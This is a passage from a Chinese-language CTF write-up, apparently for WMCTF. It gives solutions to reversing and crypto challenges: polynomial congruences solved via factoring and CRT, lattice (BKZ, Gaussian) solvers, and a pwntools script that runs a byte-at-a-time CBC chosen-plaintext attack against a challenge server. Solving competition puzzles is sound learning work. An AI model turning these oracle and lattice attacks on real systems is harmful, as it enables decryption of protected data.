+</span></span><span class=line><span class=cl>    <span class=mh>0xAC</span><span class=p>,</span> <span class=mh>0xF4</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0xC1</span><span class=p>,</span> <span class=mh>0x8E</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>d_1</span> <span class=o>=</span> <span class=n>inp_1</span> <span class=o>-</span> <span class=n>out_1</span>
+</span></span><span class=line><span class=cl><span class=n>d_2</span> <span class=o>=</span> <span class=n>inp_2</span> <span class=o>-</span> <span class=n>out_2</span>
+</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=n>d_1</span><span class=p>,</span> <span class=n>d_2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=c1># 0x1000000000000000000000000000000e98c3c3c3c3c3c3c3c3c3c3c3c3c3c6b15</span>
+</span></span></code></pre></div><p>逻辑如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>输入flag{1234567812345678123456781234567812345678123456781234567812345678}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>0x1234567812345678123456781234567812345678123456781234567812345678
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>input*input
+</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d840
+</span></span><span class=line><span class=cl>-2
+</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
+</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e*0x1234567812345678123456781234567812345678123456781234567812345678
+</span></span><span class=line><span class=cl>0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a689e5cde7db5cbad9a071fa7bd9258cce857771d1a567a98538f633e94023110
+</span></span><span class=line><span class=cl>-0x1234567812345678123456781234567812345678123456781234567812345678
+</span></span><span class=line><span class=cl>0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98
+</span></span><span class=line><span class=cl>mod
+</span></span><span class=line><span class=cl>0xF4, 0x56, 0x29, 0xCE, 0xB3, 0x4D, 0x25, 0xBD, 0xD4, 0xC2, 
+</span></span><span class=line><span class=cl>  0xED, 0xDA, 0x01, 0xB2, 0x67, 0xDF, 0x8E, 0xBB, 0x5F, 0x00, 
+</span></span><span class=line><span class=cl>  0x1F, 0x6D, 0x5A, 0x2F, 0x3D, 0x85, 0xE8, 0xF3, 0x8F, 0x45, 
+</span></span><span class=line><span class=cl>  0xB3, 0x6F
+</span></span><span class=line><span class=cl>这是mod1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>mod1*input
+</span></span><span class=line><span class=cl>0x60, 0xBA, 0x26, 0x58, 0x6D, 0x56, 0xC2, 0xF6, 0xBA, 0x2C, 
+</span></span><span class=line><span class=cl>  0x2C, 0xFE, 0x23, 0x6D, 0x59, 0xD6, 0xBD, 0x02, 0xF6, 0x50, 
+</span></span><span class=line><span class=cl>  0x08, 0x62, 0x54, 0x3C, 0xA9, 0x5E, 0xD7, 0x0B, 0xAD, 0x3A, 
+</span></span><span class=line><span class=cl>  0xA2, 0xE1, 0x55, 0xF1, 0x6C, 0x91, 0x48, 0x55, 0xD1, 0xF2, 
+</span></span><span class=line><span class=cl>  0xFA, 0x7E, 0x67, 0xEB, 0x91, 0x3E, 0x3A, 0x13, 0xF8, 0xA8, 
+</span></span><span class=line><span class=cl>  0x9D, 0x98, 0xAD, 0x49, 0x3F, 0xAD, 0x0C, 0x4D, 0xBC, 0xDD, 
+</span></span><span class=line><span class=cl>  0x08, 0x71, 0xF1, 0x07
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  mod1*input-0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
+</span></span><span class=line><span class=cl>  0x22, 0xE2, 0x31, 0x3A, 0x11, 0x3F, 0x8D, 0xB9, 0x42, 0xD6, 
+</span></span><span class=line><span class=cl>  0xB6, 0xA1, 0x8F, 0xD7, 0xA3, 0x5A, 0x0D, 0x2E, 0x00, 0xB6, 
+</span></span><span class=line><span class=cl>  0x3B, 0x4E, 0x1E, 0x82, 0xC0, 0x0B, 0x61, 0x32, 0xA8, 0xA8, 
+</span></span><span class=line><span class=cl>  0xEB, 0xE8, 0xB4, 0xD0, 0x5F, 0xB5, 0xC3, 0x73, 0x04, 0x36, 
+</span></span><span class=line><span class=cl>  0x92, 0xDC, 0xDA, 0x4D, 0x45, 0xDB, 0xED, 0x94, 0xC7, 0x84, 
+</span></span><span class=line><span class=cl>  0x91, 0x39, 0x99, 0x64, 0x73, 0x6D, 0x14, 0xA7, 0x30, 0xBD, 
+</span></span><span class=line><span class=cl>  0x2C, 0x0A, 0xA6, 0x06, 0x00
+</span></span><span class=line><span class=cl>  和0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod
+</span></span><span class=line><span class=cl>  mod2
+</span></span><span class=line><span class=cl>  0x9C, 0x23, 0x26, 0x35, 0x7B, 0xB2, 0x09, 0xE8, 0xA0, 0xAC, 
+</span></span><span class=line><span class=cl>  0x2D, 0x99, 0x7B, 0x0A, 0x8C, 0x99, 0xF6, 0x7C, 0x5F, 0xCB, 
+</span></span><span class=line><span class=cl>  0x15, 0x6E, 0x54, 0xBA, 0xBF, 0x36, 0x3E, 0xC4, 0x50, 0xDB, 
+</span></span><span class=line><span class=cl>  0xE6, 0x61
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  mod2*mod1
+</span></span><span class=line><span class=cl>  0xB0, 0x58, 0x4C, 0xB4, 0x20, 0x87, 0xA0, 0x19, 0x9D, 0xF5, 
+</span></span><span class=line><span class=cl>  0x83, 0x1D, 0x83, 0x0F, 0xC3, 0xB8, 0x6B, 0x3D, 0x56, 0x42, 
+</span></span><span class=line><span class=cl>  0xCF, 0xA7, 0xE8, 0x3E, 0xD1, 0xA5, 0xF3, 0xCE, 0x06, 0x6D, 
+</span></span><span class=line><span class=cl>  0x45, 0x88, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, 
+</span></span><span class=line><span class=cl>  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, 
+</span></span><span class=line><span class=cl>  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, 
+</span></span><span class=line><span class=cl>  0x1D, 0xA8, 0xB7, 0x2A, 0x00
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  mod2*mod1-input
+</span></span><span class=line><span class=cl>  0x38, 0x02, 0x18, 0xA2, 0xA8, 0x30, 0x6C, 0x07, 0x25, 0x9F, 
+</span></span><span class=line><span class=cl>  0x4F, 0x0B, 0x0B, 0xB9, 0x8E, 0xA6, 0xF3, 0xE6, 0x21, 0x30, 
+</span></span><span class=line><span class=cl>  0x57, 0x51, 0xB4, 0x2C, 0x59, 0x4F, 0xBF, 0xBC, 0x8E, 0x16, 
+</span></span><span class=line><span class=cl>  0x11, 0x76, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, 
+</span></span><span class=line><span class=cl>  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, 
+</span></span><span class=line><span class=cl>  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, 
+</span></span><span class=line><span class=cl>  0x1D, 0xA8, 0xB7, 0x2A
+</span></span><span class=line><span class=cl>  mod2*mod1-input和0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod
+</span></span><span class=line><span class=cl>  0x84, 0x89, 0x81, 0xDB, 0x91, 0x0B, 0x73, 0x5D, 0xAE, 0xE3, 
+</span></span><span class=line><span class=cl>  0xC3, 0x37, 0x30, 0x51, 0x21, 0x52, 0xD5, 0x1B, 0x83, 0xD4, 
+</span></span><span class=line><span class=cl>  0x37, 0x45, 0x8C, 0xA4, 0xF6, 0xBA, 0x76, 0xC3, 0xAF, 0xE3, 
+</span></span><span class=line><span class=cl>  0xDD, 0xE2
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  mod3
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  mod3结果和
+</span></span><span class=line><span class=cl>  0x45, 0x84, 0x2F, 0x86, 0x44, 0x61, 0x1A, 0xDE, 0x59, 0x37, 
+</span></span><span class=line><span class=cl>  0xD6, 0xD7, 0xC2, 0x8D, 0x6A, 0x67, 0xB1, 0x35, 0xB9, 0x53, 
+</span></span><span class=line><span class=cl>  0xC7, 0xCF, 0xEF, 0xBD, 0xD5, 0x35, 0x85, 0x7D, 0x79, 0x04, 
+</span></span><span class=line><span class=cl>  0x47, 0x23
+</span></span><span class=line><span class=cl>  比较  
+</span></span></code></pre></div><p>总结为：
+$$
+\begin{aligned}
+y &\equiv x^2 - 2 \
+z &\equiv y \cdot x - x \equiv x^3 - 3x \pmod{n} \
+a &\equiv z \cdot x - y \equiv (x^3 - 3x )x - (x^2 - 2) \equiv x^4 - 4x^2 + 2 \pmod{n} \
+b &\equiv a \cdot z - x \equiv (x^4-4x^2 + 2) (x^3 - 3x)
+-x \equiv x^7 -7x^5 + 14x^3 - 7x \pmod{n}
+\end{aligned}
+$$</p><p>试了一下，模数n可以被分解为两个素数：</p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png alt loading=lazy decoding=async></p><p>p = 320265757102059730318470218759311257989
+q = 361550014853497117429835520396253724753</p><p>通过Mathematica可以分别在mod p和mod q上解出来x</p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png alt loading=lazy decoding=async></p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png alt loading=lazy decoding=async></p><p>然后再用CRT即可得到在mod n下的解：17608204545242378720348793798058123425575979093234353645947732994798163637792</p><p>程序输入flag{26EDE3FE048B6BFA04F647259A3F00505FD9C9CCB87298CD631FD91F17CCB620}</p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png alt loading=lazy decoding=async></p><p>提交需要将"flag"改成"WMCTF"</p><h3 id=easy_apk>easy_apk</h3><p>一个安卓逆向,字符串都被加密了,看了一下调用了native的check函数,在ida里看了一下check函数,判断长度是不是32,然后取出偶数位,使用AES加密,然后用加密的结果,作为祖冲之算法的密钥加密全部的flag.
+后来改题了AES生成的那个祖冲之算法的key,是已知的了,然后因为那个是流加密,所以直接把加密后的flag带回去就拿到flag了.</p><h2 id=crypto>Crypto</h2><h3 id=babysum>babySum</h3><p>Random BKZ Blocksize 24</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>json</span> <span class=n>import</span> <span class=nb>load</span>
+</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>re</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check</span><span class=p>(</span><span class=n>sol</span><span class=p>,</span> <span class=n>A</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span><span class=p>,</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>zip</span><span class=p>(</span><span class=n>sol</span><span class=p>,</span> <span class=n>A</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>+=</span> <span class=n>x</span><span class=o>*</span><span class=n>a</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>k</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>d</span> <span class=o>=</span> <span class=mi>20</span><span class=p>,</span> <span class=mi>120</span><span class=p>,</span> <span class=mf>0.8</span>
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>,</span> <span class=n>A</span> <span class=o>=</span> <span class=nb>load</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=mi>50</span>
+</span></span><span class=line><span class=cl><span class=n>BS</span> <span class=o>=</span> <span class=mi>24</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>lat</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>enumerate</span><span class=p>(</span><span class=n>A</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>lat</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=mi>1</span><span class=o>*</span><span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>)]</span> <span class=o>+</span> <span class=p>[</span><span class=n>N</span><span class=o>*</span><span class=n>a</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=n>N</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>lat</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>n</span> <span class=o>+</span> <span class=p>[</span><span class=n>N</span><span class=o>*</span><span class=n>s</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=n>k</span><span class=o>*</span><span class=n>N</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>itr</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>itr</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>itr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>nums</span> <span class=o>=</span> <span class=n>lat</span><span class=p>[::]</span>
+</span></span><span class=line><span class=cl>    <span class=n>shuffle</span><span class=p>(</span><span class=n>nums</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=n>nums</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ml</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>BKZ</span><span class=p>(</span><span class=n>block_size</span><span class=o>=</span><span class=n>BS</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>enumerate</span><span class=p>(</span><span class=n>ml</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>&lt;=</span> <span class=nb>min</span><span class=p>(</span><span class=n>row</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span> <span class=ow>and</span> <span class=nb>max</span><span class=p>(</span><span class=n>row</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span> <span class=o>&lt;=</span> <span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>len</span><span class=p>(</span><span class=n>row</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>row</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>row</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*=</span> <span class=o>-</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>        <span class=n>temp_bool</span> <span class=o>=</span> <span class=p>(</span><span class=n>check</span><span class=p>(</span><span class=n>row</span><span class=p>,</span> <span class=n>A</span><span class=p>)</span> <span class=o>==</span> <span class=n>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>temp_bool</span> <span class=o>==</span> <span class=n>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>row</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>quit</span><span class=p>()</span>
+</span></span></code></pre></div><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png alt loading=lazy decoding=async></p><h3 id=piece_of_cake>piece_of_cake</h3><p>二维格可以用高斯格基规约，多试几组数据就可以跑出来了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from gmpy2 import iroot, sqrt
+</span></span><span class=line><span class=cl>from Crypto.Util.number import *
+</span></span><span class=line><span class=cl>from pwn import remote
+</span></span><span class=line><span class=cl>import string
+</span></span><span class=line><span class=cl>from hashlib import sha256
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r = remote(&#39;81.68.174.63&#39;, 8631)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def proof_of_work(txt, Hash):
+</span></span><span class=line><span class=cl>    S = string.ascii_letters+string.digits
+</span></span><span class=line><span class=cl>    for a in S:
+</span></span><span class=line><span class=cl>        for b in S:
+</span></span><span class=line><span class=cl>            for c in S:
+</span></span><span class=line><span class=cl>                if sha256((a+b+c+txt).encode()).hexdigest() == Hash:
+</span></span><span class=line><span class=cl>                    print(a+b+c)
+</span></span><span class=line><span class=cl>                    return a+b+c
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def gaussian(v1, v2):
+</span></span><span class=line><span class=cl>    while True:
+</span></span><span class=line><span class=cl>        if sqrt(v2[0]**2+v2[1]**2) &lt; sqrt(v1[0]**2+v1[1]**2):
+</span></span><span class=line><span class=cl>            v1, v2 = v2, v1
+</span></span><span class=line><span class=cl>        m = int((v1[0]*v2[0]+v1[1]*v2[1])/(v1[0]**2+v1[1]**2))
+</span></span><span class=line><span class=cl>        if m == 0:
+</span></span><span class=line><span class=cl>            return (v1, v2)
+</span></span><span class=line><span class=cl>        v2 = [v2[0]-m*v1[0], v2[1]-m*v1[1]]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.recvuntil(&#34;XXX+&#34;)
+</span></span><span class=line><span class=cl>nonce = r.recv(17).decode()
+</span></span><span class=line><span class=cl>r.recvuntil(&#34; == &#34;)
+</span></span><span class=line><span class=cl>target = r.recv(64).decode()
+</span></span><span class=line><span class=cl>r.recvuntil(&#34;\nGive me XXX:&#34;)
+</span></span><span class=line><span class=cl>w = proof_of_work(nonce, target)
+</span></span><span class=line><span class=cl>r.send(str(w)+&#34;\n&#34;)
+</span></span><span class=line><span class=cl>print(&#34;----------proof of work is ok!----------&#34;)
+</span></span><span class=line><span class=cl>temp = r.recvuntil(&#34;What&#39;s your choice?\n&#34;)
+</span></span><span class=line><span class=cl>r.send(&#34;1\n&#34;)
+</span></span><span class=line><span class=cl>temp = r.recvline()
+</span></span><span class=line><span class=cl>temp = r.recvline().strip().decode().split(&#34; &#34;)
+</span></span><span class=line><span class=cl>q, h, c = [int(i) for i in temp]
+</span></span><span class=line><span class=cl>N = int(r.recvline().strip().decode())
+</span></span><span class=line><span class=cl>cip = int(r.recvline().strip().decode())
+</span></span><span class=line><span class=cl>s1, s2 = gaussian([1, h], [0, q])
+</span></span><span class=line><span class=cl>f, g = s1[0], s1[1]
+</span></span><span class=line><span class=cl>cake = (c*f % q) % g
+</span></span><span class=line><span class=cl>cake = inverse(f, g)*cake % g
+</span></span><span class=line><span class=cl>for k in range(100000):
+</span></span><span class=line><span class=cl>    if pow(cake+k*g, 0x10001, N) == cip:
+</span></span><span class=line><span class=cl>        cake = cake+k*g
+</span></span><span class=line><span class=cl>        print(&#34;cake is: &#34;, cake)
+</span></span><span class=line><span class=cl>        break
+</span></span><span class=line><span class=cl>r.send(str(cake)+&#34;\n&#34;)
+</span></span><span class=line><span class=cl>print(r.recvline().strip().decode())
+</span></span><span class=line><span class=cl>#WMCTF{Wh4t_A_pi3ce_of_CAKE!}
+</span></span></code></pre></div><h3 id=game>Game</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import remote
+</span></span><span class=line><span class=cl>from hashlib import sha256
+</span></span><span class=line><span class=cl>from Crypto.Util.number import *
+</span></span><span class=line><span class=cl>import string
+</span></span><span class=line><span class=cl>import os
+</span></span><span class=line><span class=cl>r = remote(&#39;81.68.174.63&#39;, 16442)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def proof_of_work(txt, Hash):
+</span></span><span class=line><span class=cl>    S = string.ascii_letters+string.digits
+</span></span><span class=line><span class=cl>    for a in S:
+</span></span><span class=line><span class=cl>        for b in S:
+</span></span><span class=line><span class=cl>            for c in S:
+</span></span><span class=line><span class=cl>                for d in S:
+</span></span><span class=line><span class=cl>                    if sha256((a+b+c+d+txt).encode()).hexdigest() == Hash:
+</span></span><span class=line><span class=cl>                        print(a+b+c+d)
+</span></span><span class=line><span class=cl>                        return a+b+c+d
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>def select_x(x):
+</span></span><span class=line><span class=cl>    r.recvuntil(&#34;3. exit\n&#34;)
+</span></span><span class=line><span class=cl>    r.recvuntil(&#34;&gt;&#34;)
+</span></span><span class=line><span class=cl>    r.send(str(x))
+</span></span><span class=line><span class=cl>    r.recvuntil(&#34;(in hex): &#34;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.recvuntil(&#34;XXXX+&#34;)
+</span></span><span class=line><span class=cl>nonce = r.recv(16).decode()
+</span></span><span class=line><span class=cl>r.recvuntil(&#34; == &#34;)
+</span></span><span class=line><span class=cl>target = r.recv(64).decode()
+</span></span><span class=line><span class=cl>print(&#34;waiting....&#34;)
+</span></span><span class=line><span class=cl>w = proof_of_work(nonce, target)
+</span></span><span class=line><span class=cl>r.send(str(w))
+</span></span><span class=line><span class=cl>print(&#34;----------proof of work is ok!----------&#34;)
+</span></span><span class=line><span class=cl>r.recvuntil(&#34;IV is: &#34;)
+</span></span><span class=line><span class=cl>IV = r.recv(32).decode()  # 16 bytes -&gt; 32 hexlength
+</span></span><span class=line><span class=cl>print(&#34;IV is: {}&#34;.format(IV))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>secret = b&#34;&#34;
+</span></span><span class=line><span class=cl>for Byte in range(48):#Byte和执行前secret的已知长度是等价的 15 = byte_len+Byte mod 16
+</span></span><span class=line><span class=cl>    byte_len = (15 - (Byte % 16)) if ((Byte % 16) != 15) else 16
+</span></span><span class=line><span class=cl>    bound = ((byte_len + Byte + 1) // 16) * 32 # 应该相等的范围应该是[bound-32:bound]
+</span></span><span class=line><span class=cl>    select_x(1)
+</span></span><span class=line><span class=cl>    r_ = os.urandom(byte_len)
+</span></span><span class=line><span class=cl>    r.send(r_.hex())
+</span></span><span class=line><span class=cl>    C_ = r.recvline().strip().decode()
+</span></span><span class=line><span class=cl>    C0 = IV if bound==32 else C_[bound-64:bound-32]
+</span></span><span class=line><span class=cl>    IV = C_[-32:] # 每次加密后及时更新IV
+</span></span><span class=line><span class=cl>    print(&#34;brute force {} byte&#34;.format(Byte+1))
+</span></span><span class=line><span class=cl>    for i in range(256):
+</span></span><span class=line><span class=cl>        select_x(1)
+</span></span><span class=line><span class=cl>        Pi = int(C0, 16) ^ int(IV, 16) ^ int((r_.hex()+secret.hex())[-30:]+long_to_bytes(i).hex(), 16)
+</span></span><span class=line><span class=cl>        r.send(long_to_bytes(Pi).hex())
+</span></span><span class=line><span class=cl>        Ci = r.recvline().strip().decode()
+</span></span><span class=line><span class=cl>        IV = Ci[-32:]
+</span></span><span class=line><span class=cl>        if Ci[:32] == C_[bound-32:bound]:
+</span></span><span class=line><span class=cl>            secret += long_to_bytes(i)
+</span></span><span class=line><span class=cl>            print(&#34;Current secret: {}&#34;.format(secret))
+</span></span><span class=line><span class=cl>            break
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>print(&#34;secret is: {}&#34;.format(secret))
+</span></span><span class=line><span class=cl>select_x(2)
+</span></span><span class=line><span class=cl>r.send(secret.hex())
+</span></span><span class=line><span class=cl>flag = r.recvline().strip().decode()
+</span></span><span class=line><span class=cl>print(flag)
+</span></span><span class=line><span class=cl>#WMCTF{Dont_ever_tell_anybody_anything___If_you_do__you_start_missing_everybody}
+</span></span></code></pre></div><h3 id=idiot-box>idiot box</h3><p><strong>Second Blood</strong></p><p>改过的DES 6轮差分攻击</p><p>现学：</p><ul><li><a href=https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41>https://medium.com/lotus-fruit/breaking-des-using-differential-cryptanalysis-958e8118ff41</a></li><li><a href=http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf>http://www.cs.technion.ac.il/~biham/Reports/differential-cryptanalysis-of-the-data-encryption-standard-biham-shamir-authors-latex-version.pdf</a></li></ul><blockquote><p>现学材料里一个可能的疑惑点：第4轮的F函数中，有5个sbox的input(6bit)的差分值都是0，所以这5个sbox的output(4bit)的差分值也都是0，经过P置换后，得到的D&rsquo;中有4*5=20bit是已知的，所以后面第6轮的F函数的output的差分值:$F&rsquo; = c&rsquo; \oplus D&rsquo; \oplus 